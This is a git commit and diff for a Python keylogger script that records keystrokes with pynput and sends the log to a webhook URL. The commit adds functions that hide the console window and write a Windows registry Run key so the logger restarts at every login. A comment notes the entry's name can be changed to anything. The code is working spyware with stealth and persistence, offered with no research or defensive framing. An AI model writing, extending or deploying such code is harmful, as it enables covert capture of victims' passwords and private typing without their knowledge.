01f7c115604b482108b830e108935f7ff29ab866
Brandon Burns <brandontbb33@gmail.com>
2025-12-11 22:29:53 -0800

    Console is now hidden when script is run. Added to user start up so that once it is opened it stays open. Added implementation if file is .py or if it is .exe (.exe coming soon).

--- Keylogger/webhooklogger.py
+++ Keylogger/webhooklogger.py
@@ -1,6 +1,9 @@
 import requests
 import threading
 import os
+import sys
+import ctypes
+import winreg
 from pynput import keyboard
 from dotenv import load_dotenv
 
@@ -13,7 +16,7 @@ from dotenv import load_dotenv
 load_dotenv() # Delete line for personal use.
 
 log = ""
-WEBHOOK_URL = os.getenv("WEBHOOK_URL") #Replace with your webhook URL.
+WEBHOOK_URL = os.getenv("WEBHOOK_URL") # Replace with your webhook URL.
 
 def report():
     global log
@@ -38,7 +41,25 @@ def on_press(key):
     if key == keyboard.Key.esc:
         return False
 
+def hide_console():
+    handle = ctypes.windll.kernel32.GetConsoleWindow()
+    if handle:
+        ctypes.windll.user32.ShowWindow(handle, 0)
+    
+# Get path to exetuable, open registry key, and add to run.
+# Note: Can change name from "Keylogger" to anything you want.
+def add_to_startup(): # Run at startup HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+    if getattr(sys, 'frozen', False):
+        path = sys.executable
+    else:
+        path = f'"{sys.executable}" "{os.path.abspath(__file__)}"'
+    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
+    winreg.SetValueEx(key, "Keylogger", 0, winreg.REG_SZ, path)
+    winreg.CloseKey(key)
+
 if __name__ == "__main__":
+    hide_console()
+    add_to_startup()
     report()
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
